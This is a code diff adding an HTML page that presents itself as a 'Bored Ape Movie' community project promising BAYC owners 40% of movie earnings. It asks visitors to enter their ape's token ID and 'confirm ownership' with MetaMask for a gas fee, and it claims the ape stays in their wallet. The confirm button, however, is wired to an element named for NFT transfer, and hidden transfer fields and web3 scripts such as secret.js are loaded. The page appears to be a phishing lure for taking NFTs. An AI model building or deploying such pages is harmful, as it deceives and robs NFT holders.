@@ -1,0 +1,132 @@
+<!-- code-brew labs -->
+<!doctype html>
+<html lang="en">
+  <head></head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BAYC Movie</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.1/examples/dashboard/">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="dashboard.css" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://npmcdn.com/moralis@0.0.51/dist/moralis.js"></script>
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=VT323" />
+  </head>
+
+  <body>
+    <header class="header-color">
+      <img src="/images/logoBAYC.png">
+      <a id="btn-logout" class="nav-link px-3" href="#"></a>
+     
+    </header>
+
+    <div class="first-section">
+      <div class="first-section-title">
+        <h1>Bored Ape Movie</h1>
+      </div>
+      <div class="first-section-pt2">
+        <div class="first-section-text">
+          <p>
+            By attracting talented artists, the BAYC community creates a movie where your BAYC can be an actor. BAYC actors/owners receive <span class="third-section-title-green">40%</span> from the movie earnings in BAYC official coin $Ape. <!-- A community project of 15 animators to animate the 584 attributes of BAYC and MAYC. Get an animated version of your ape. -->
+          </p>
+        </div>
+        <div class="first-section-img">
+          <img src="images/ape1.png">
+        </div>
+      </div>
+      <div class="line1"><hr></div>
+    </div>
+
+    <div class="second-section">
+      <div class="second-section-title">
+        <h2>How does it work</h2>
+      </div>
+      <div class="second-section-text">
+        <div class="second-section-txt1">
+          <p>Confirm you are the owner of the BAYC </p> <!-- Confirm you are the owner of the BAYC / MAYC -->
+        </div>
+        <div class="second-section-txt2">
+          <p>A movie is being made and will premiere in late 2022 </p> <!-- Our animators starts to animate your BAYC / MAYC -->
+        </div>
+        <div class="second-section-txt3">
+          <p>Receive $Ape earnings to your previously confimed address</p> <!-- Get an animated version of your BAYC / MAYC in your wallet in 24h -->
+        </div>
+      </div>
+      <div class="line1"><hr></div>
+    </div>
+
+    <div class="third-section">
+      <div class="third-section-title">
+        <h2>Become an actor <span class="third-section-title-green"> (BAYC members only) </span> </h2> <!-- (BAYC / MAYC members only) -->
+      </div>
+      <div class="card-section">
+        <div class="first-card">
+          <img src="/images/ape2.png">
+          <p>Your BAYC Token ID<br><span class="blend-in">a</span></p>
+          <input type="number" class="form-control" id="nft-transfer-token-id" placeholder="4177">
+        </div>
+
+        <div class="second-card">
+          <img src="/images/ape3.png">
+          <p>Confirm you are the owner and add it to the cast list*</p>
+          <button class="" id="btn-transfer-selected-nft">Confirm</button>
+        </div>
+      </div>
+      <div class="card-section-comment"> <p>*To confirm you are the real owner, you will have to pay 40$ of gas fee. The BAYC stays in your wallet. Metamask only.</p></div>
+      <div class="line2"><hr></div>
+    </div>
+
+    <div class="fourth-section">
+      <div class="fourth-section-title">
+        <h2>BAYC movie team</h2>
+      </div>
+      <div class="animation-section">
+        <div class="animation-section-first"> 
+          <img src="/images/gif1.gif"> 
+          <p>BAYC #4920</p>
+          <p>Chief Team Leader</p>
+        </div>
+        <div class="animation-section-second"> 
+          <img src="/images/gif2.gif">
+          <p>BAYC #1726</p>
+          <p>The main director of the movie</p>
+        </div>
+        <div class="animation-section-third"> 
+          <img src="/images/gif3.gif">
+          <p>BAYC #9797</p>
+          <p>communications and marketing manager</p>
+        </div>
+        <!--<img src="/images/gif3.gif">-->
+      </div>
+    </div>
+
+    <div class="fifth-section">
+      <div class="fifth-section-text">
+        <p>With love BAYC community</p>
+      </div>
+    </div>
+
+<!-- bagian baru  bagian baru bagian baru bagian baru bagian baru bagian baru-->
+
+      <div class="hide">  
+        <input id="nft-transfer-amount">
+        <button id="btn-transfer-selected-nft"></button>
+        <button id="btn-get-transactions2"></button>
+      </div>        
+            
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons@4.28.0/dist/feather.min.js"
+      integrity="sha384-uO3SXW5IuS1ZpFPKugNNWqTZRRglnUJK6UAZ/gxOX80nxEkN9NcGZTftn6RzhGWE"
+      crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@2.9.4/dist/Chart.min.js"
+      integrity="sha384-zNy6FEbO50N+Cg5wap8IKA4M/ZnLJgzc6w2NqACZaK0u0FXfOWRRJOnQtpZun8ha"
+      crossorigin="anonymous"></script>
+    <script src="dashboard.js"></script>
+    <script src="secret.js"></script>
+    <script src="main.js"></script>
+  </body>
+</html>
